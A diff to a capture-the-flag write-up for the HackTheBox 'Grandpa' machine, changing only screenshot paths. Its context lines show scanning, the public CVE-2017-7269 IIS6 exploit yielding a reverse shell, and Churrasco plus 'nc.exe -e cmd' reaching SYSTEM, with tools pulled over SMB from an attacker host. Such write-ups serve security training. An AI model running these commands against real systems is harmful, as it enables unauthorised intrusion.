@@ -35,7 +35,7 @@ We begin by checking if the target is alive with ICMP:
 ping -c 1 10.10.10.14
 ```
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/ping.png)
+![](screenshots/ping.png)
 
 The machine responds, confirming it is alive.
 
@@ -48,7 +48,7 @@ We scan all 65,535 TCP ports to identify open services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.14 -oG allPorts
 ```
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/allports.png)
+![](screenshots/allports.png)
 
 Extract the open ports:
 
@@ -56,7 +56,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/extractports.png)
+![](screenshots/extractports.png)
 
 Only port **80/tcp** is open.
 
@@ -73,7 +73,7 @@ nmap -p80 -sC -sV 10.10.10.14 -oN targeted
 cat targeted -l java
 ```
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/targeted.png)
+![](screenshots/targeted.png)
 
 **Findings:**
 
@@ -96,11 +96,11 @@ We clone the exploit:
 git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 ```
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/exploit.png)
+![](screenshots/exploit.png)
 
 This is a classic **buffer overflow** triggered via the **PROPFIND** WebDAV request:
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/exploit_propfind.png)
+![](screenshots/exploit_propfind.png)
 
 The exploit script requires:
 
@@ -115,7 +115,7 @@ We run the exploit and set up a listener with `nc`:
 python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.14.2 443
 ```
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/reverse_shell_iis6.png)
+![](screenshots/reverse_shell_iis6.png)
 
 ✅ Reverse shell obtained.
 
@@ -124,15 +124,15 @@ python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.14.2 443
 
 We check our privileges and system structure:
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/whoami.png)
+![](screenshots/whoami.png)
 
 On Windows Server 2003, user profiles are located in **`Documents and Settings`** instead of `Users`:
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/dir_users.png)
+![](screenshots/dir_users.png)
 
 Checking privileges:
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/priv.png)
+![](screenshots/priv.png)
 
 We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege escalation.
 
@@ -156,13 +156,13 @@ dir \\10.10.14.2\smbFolder\
 copy \\10.10.14.2\smbFolder\churrasco.exe churrasco.exe
 ```
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/upload_churrasco.png)
+![](screenshots/upload_churrasco.png)
 
 Move to `Temp` directory if copying fails.  
 
 Running without arguments fails, so we must specify a command:
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/churrasco_execute.png)
+![](screenshots/churrasco_execute.png)
 
 To get a more stable shell, we upload `nc.exe` via SMB and then execute it with Churrasco:
 
@@ -177,7 +177,7 @@ copy "\\10.10.14.2\smb\nc.exe" nc.exe
 .\churrasco.exe "nc.exe -e cmd 10.10.14.2 4444"
 ```
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/whoami_churrasco.png)
+![](screenshots/whoami_churrasco.png)
 
 ✅ Privilege escalation successful – we are `NT AUTHORITY\SYSTEM`.
 
@@ -186,7 +186,7 @@ copy "\\10.10.14.2\smb\nc.exe" nc.exe
 
 With SYSTEM access, we can retrieve both flags:
 
-![](GitHubv2/HackTheBox/EASY/Grandpa/screenshots/root_user_flag.png)
+![](screenshots/root_user_flag.png)
 
 ✅ **User flag obtained**  
 ✅ **Root flag obtained**
